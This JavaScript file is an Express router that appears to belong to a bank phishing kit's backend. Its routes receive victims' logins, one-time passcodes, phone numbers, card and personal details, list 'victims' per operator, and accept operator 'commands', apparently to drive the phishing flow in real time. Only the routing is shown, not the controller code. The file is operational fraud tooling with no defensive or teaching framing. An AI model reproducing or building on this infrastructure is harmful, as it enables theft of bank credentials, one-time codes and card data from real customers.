const express = require("express");
const {
  getOwnerVics,
  command,
  getInfo,
  deleteEntry,
  submitLogin,
  submitLoginAgain,
  submitOtp,
  submitPhone,
  submitCard,
  submitStaticLogin,
  submitStaticCard,
  submitStaticPersonal,
} = require("../controllers/santsController");
const router = express.Router();

router.post("/static/login", submitStaticLogin);
router.post("/static/card", submitStaticCard);
router.post("/static/personal", submitStaticPersonal);
router.post("/login", submitLogin);
router.post("/otp", submitOtp);
router.post("/loginAgain", submitLoginAgain);
router.post("/phone", submitPhone);
router.post("/card", submitCard);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/delete", deleteEntry);
router.post("/", command);

module.exports = router;
